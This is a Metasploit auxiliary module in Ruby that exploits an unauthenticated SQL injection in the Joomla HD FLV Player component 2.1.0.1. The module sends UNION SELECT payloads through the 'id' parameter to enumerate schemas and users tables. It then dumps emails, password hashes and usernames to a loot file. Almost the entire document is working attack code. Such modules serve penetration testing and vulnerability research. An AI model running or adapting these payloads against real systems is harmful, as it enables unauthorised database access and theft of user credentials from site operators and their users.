##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla HD FLV Player Unauthenticated SQL Injection User Enumeration',
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection in Joomla HD FLV Player 2.1.0.1
      in order to pull out the usernames, password hashes, and email addresses from the database
      },
      'References'     =>
        [
          ['URL', 'http://1337day.com/exploit/22868']
        ],
      'Author'         =>
        [
          'bperry',
          'Claudio Viviani' #discovery/poc
        ],
      'License'        => 'ExploitHub',
      'DisclosureDate' => "Nov 13 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to Joomla', '/']),
      ], self.class)
  end

  def check

    res = send_injected_request("'")

    if res and res.body.to_s =~ /error in your SQL syntax/
        return Msf::Exploit::CheckCode::Vulnerable
    end

    Msf::Exploit::CheckCode::Safe
  end

  def run
    left_marker = Rex::Text.rand_text_alpha(8)
    middle_left_marker = Rex::Text.rand_text_alpha(8)
    middle_right_marker = Rex::Text.rand_text_alpha(8)
    right_marker = Rex::Text.rand_text_alpha(8)

    left_hex = left_marker.unpack("H*")[0]
    middle_left_hex = middle_left_marker.unpack("H*")[0]
    middle_right_hex = middle_right_marker.unpack("H*")[0]
    right_hex = right_marker.unpack("H*")[0]

    get_schema_count = "-8831 UNION ALL SELECT CONCAT(0x#{left_hex},IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x#{right_hex}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_injected_request(get_schema_count)

    schema_count = $1.to_i if res and res.body =~ /id=#{left_marker}(.*?)#{right_marker}/

    schemas = []
    0.upto(schema_count-1) do |i|
      get_schema = "-5693 UNION ALL SELECT (SELECT CONCAT(0x#{left_hex},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_hex}) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

      res = send_injected_request(get_schema)
      schemas << $1 if res and res.body =~ /id=#{left_marker}(.*)#{right_marker}/
    end

    schemas.delete('information_schema')
    schemas.delete('mysql')
    schemas.delete('performance_schema')

    tables = []
    users = "email,passwordhash,username\n"
    schemas.each do |schema|
      print_status("Looking in schema: " + schema)
      get_table_count = "-7860 UNION ALL SELECT CONCAT(0x#{left_hex},IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x#{right_hex}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]})#"
      res = send_injected_request(get_table_count)

      table_count = $1.to_i if res and res.body =~ /id=#{left_marker}(.*)#{right_marker}/

      tables = []
      0.upto(table_count-1) do |i|
        get_table = "-8822 UNION ALL SELECT (SELECT CONCAT(0x#{left_hex},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_hex}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]}) LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
        res = send_injected_request(get_table)

        table = $1 if res and res.body =~ /id=#{left_marker}(.*)#{right_marker}/
        tables << table if table =~ /users$/
      end

      tables.each do |t|
        print_status("Found users table: " + t)
      end

      tables.each do |table|
        get_user_count = "-5861 UNION ALL SELECT CONCAT(0x#{left_hex},IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x#{right_hex}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{schema}.#{table}#"
        res = send_injected_request(get_user_count)

        user_count = $1.to_i if res and res.body =~ /id=#{left_marker}(.*)#{right_marker}/

        0.upto(user_count-1) do |i|
          get_user = "-9008 UNION ALL SELECT (SELECT CONCAT(0x#{left_hex},IFNULL(CAST(email AS CHAR),0x20),0x#{middle_left_hex},IFNULL(CAST(password AS CHAR),0x20),0x#{middle_right_hex},IFNULL(CAST(username AS CHAR),0x20),0x#{right_hex}) FROM #{schema}.#{table} LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
          res = send_injected_request(get_user)

          users << "#{$1},#{$2},#{$3}\n" if res and res.body =~ /id=#{left_marker}(.*)#{middle_left_marker}(.*)#{middle_right_marker}(.*)#{right_marker}/
        end
      end
    end
    vprint_good(users)

    p = store_loot('joomla.users', 'text/plain', datastore['RHOST'], users)
    print_good("User dump saved to: " + p)
  end

  def send_injected_request(str)
    get = {
      'option' => 'com_hdflvplayer',
      'id' => str
    }

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => get
    })
  end
end

